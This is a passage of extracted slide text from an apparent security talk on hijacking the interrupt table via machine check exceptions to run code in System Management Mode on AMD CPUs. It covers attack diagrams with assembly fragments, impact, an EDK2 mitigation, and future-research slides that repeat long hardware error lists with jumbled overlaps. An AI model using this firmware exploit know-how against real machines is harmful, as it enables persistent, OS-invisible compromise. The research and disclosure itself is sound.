… ffffffffc0b2ed80 ffffffffc0b2edc0 ffffffffc0b2ee40 … RAM push %%rax push %%rdi push %%rsi call os_mce_handler pop %%rsi pop %%rdi pop %%rax iretq … MMIO ffffffffc0197da0 … push %%rax push %%rdi push %%rsi RAM call smm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 211

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
SMI#
Hijack IDT

## Slide 212

(demo)

the exploit.

## Slide 213

## Slide 214

⊷Arbitrary code execution with SMM privileges

- ⊸ “ring -2”

- ⊸ Invisible to operating system, hypervisor, etc.

- ⊸ Can preempt OS, hypervisor, etc.

- ⊸ Critical to platform security, server RAS, client miscellanea

- ⊸ Firmware R/W access in many configurations

impact

## Slide 215

⊷Malicious IDT allowed in SMM, on all AMD CPUs ⊷MCE, developed on pre-Zen

mitigation

## Slide 216

## ⊷Mitigate MCE path

⊸ EDK2 SMM code is correct, but assumes IDT made safe by microcode ⊸ On platforms leaving IDT in untrusted state, EDK2 should be changed to reload IDT sooner ⊸ Submitted patch to remove MCE vector

mitigation

## Slide 217

⊷IDT issue remains

⊸ `try { main() } except { pop_shell() }`

mitigation

## Slide 218

⊷Machine checks are powerful, but have never been explored for exploitation

# future research

## Slide 219

⊷Other sources of MCEs

future research

## Slide 220

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error" "MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" "MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error" "CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error" "SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error” "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error” "Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error” "Rx Replay Timeout Error” "LinkSub Tx Timeout Error” "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" ⊷Other sources of MCEs "RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0” "Parity error or ECC error for S0 RAM1" "Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error” "Data Startup Limit Error” "LS0 Exit Error” "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error" "FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error" "Packet Type Error" "Rx FIFO Error" "Deskew Error" "Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error" "Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error" "Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error" "Remote Link Fatal Error" "Data Loss Error" "Training Error" "Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error" "Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error" "LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

## Slide 221

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error" "MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" "MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error" "CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error" "SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error” "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error” "Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error” "Rx Replay Timeout Error” "LinkSub Tx Timeout Error” "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" ⊷Other sources of MCEs "RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0” "Parity error or ECC error for S0 RAM1" "Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error” "Data Startup Limit Error” "LS0 Exit Error” "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error" "FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error" "Packet Type Error" "Rx FIFO Error" "Deskew Error" "Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error" "Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error" "Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error" "Remote Link Fatal Error" "Data Loss Error" "Training Error" "Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error" "Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error" "LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

ECC injection processor errata row-hammer bit flips in DRAM

## Slide 222

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error"

"MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error"

"MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error"

"CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error"

"SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error” "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error” "Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error” "Rx Replay Timeout Error” "LinkSub Tx Timeout Error” "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" ⊷Other sources of MCEsOther sources of MCEs "RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" ⊷Asynchronous MCEsAsynchronous MCEs "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0” "Parity error or ECC error for S0 RAM1" "Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error” "Data Startup Limit Error” "LS0 Exit Error” "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error" "FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error" "Packet Type Error" "Rx FIFO Error" "Deskew Error" "Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error" "Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error" "Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error" "Remote Link Fatal Error" "Data Loss Error" "Training Error" "Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error" "Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error" "LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

⊷Other sources of MCEsOther sources of MCEs ⊷Asynchronous MCEsAsynchronous MCEs

ECC injection processor errata row-hammer bit flips in DRAM memory scrubber other MMIO no MMIO

## Slide 223

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error"

"MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" "MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error"

"CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error"

"SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"

"CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error”

"Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error"

"Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error” "Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error” "Rx Replay Timeout Error” "LinkSub Tx Timeout Error” "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" ⊷Other sources of MCEs "RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" ⊷Asynchronous MCEs "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0” ⊷Userland MCEs "Parity error or ECC error for S0 RAM1" "Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error” "Data Startup Limit Error” "LS0 Exit Error” "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error" "FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error" "Packet Type Error" "Rx FIFO Error" "Deskew Error" "Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error" "Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error" "Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error" "Remote Link Fatal Error" "Data Loss Error" "Training Error"

⊷Other sources of MCEs ⊷Asynchronous MCEs ⊷Userland MCEs

ECC injection processor errata row-hammer bit flips in DRAM memory scrubber other MMIO no MMIO ring-3 errata faulty devices here-be-dragons

"Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error"

"Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error" "LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

## Slide 224

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error"

"MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error"

"MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error"

"CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error"

"SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"

"CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error”

"Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error"

"Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error"

"Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error"

"Recovery Attempt Error" "Recovery Relock Attempt Error” "Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error” "Rx Replay Timeout Error” "LinkSub Tx Timeout Error” "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" "RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0”

⊷Other sources of MCEs ⊷Asynchronous MCEs ⊷Userland MCEs ⊷Other exploit targets

"Parity error or ECC error for S0 RAM1"

"Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error” "Data Startup Limit Error” "LS0 Exit Error” "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error"

"FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error"

ECC injection processor errata row-hammer bit flips in DRAM memory scrubber other MMIO no MMIO ring-3 errata faulty devices here-be-dragons hypervisors secure guests enclaves secure loader

"Packet Type Error" "Rx FIFO Error" "Deskew Error"

"Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error"

"Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error"

"Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error"

"Remote Link Fatal Error" "Data Loss Error" "Training Error"

"Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"

"CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error"

"Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error"

"LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

## Slide 225

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error"

ECC injection "MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" ” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" processor errata "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"”” row-hammer bit flips in DRAM memory scrubber other MMIO ⊷Other sources of MCEs no MMIO ⊷Asynchronous MCEs ring-3 errata ⊷Userland MCEs faulty devices here-be-dragons ⊷Other exploit targets hypervisors ⊷Other architectures secure guests enclaves secure loader ARM RISC-V MIPS PowerPC/Power

"MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error"

"MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error"

"Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error"

"CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error"

"SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"”

"CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"””

"Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error"

"Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error"

"Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error"

"Recovery Attempt Error" "Recovery Relock Attempt Error”

"Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error”

"Rx Replay Timeout Error” "LinkSub Tx Timeout Error”

"LinkSub Rx Timeout Error" "Rx CMD Pocket Error"

"RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0”

"Parity error or ECC error for S0 RAM1"

"Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1"

"AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error"

"Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error"

"Recovery Attempt Error" "Eye Training Timeout Error”

"Data Startup Limit Error” "LS0 Exit Error”

"PLL powerState Update Timeout Error" "Rx FIFO Error"

"Lcu Error" "Conv CECC Error" "Conv UECC Error"

"Reserved" "Rx DataLoss Error" "Replay CECC Error"

"Replay UECC Error" "CRC Error" "BER Exceeded Error"

"FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error"

"Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error"

"Packet Type Error" "Rx FIFO Error" "Deskew Error"

"Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error"

"Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error"

"Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error"

"Remote Link Fatal Error" "Data Loss Error" "Training Error"

"Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"

"CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error"

"Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error"

"LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

## Slide 226

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error"

ECC injection "MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" ” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" processor errata "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"”” row-hammer bit flips in DRAM memory scrubber other MMIO ⊷Other sources of MCEs no MMIO ⊷Asynchronous MCEs ring-3 errata ⊷Userland MCEs faulty devices here-be-dragons ⊷Other exploit targets hypervisors ⊷Other architectures secure guests ⊷Tip of the iceberg… enclaves secure loader ARM RISC-V MIPS PowerPC/Power future research ???

"MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error"

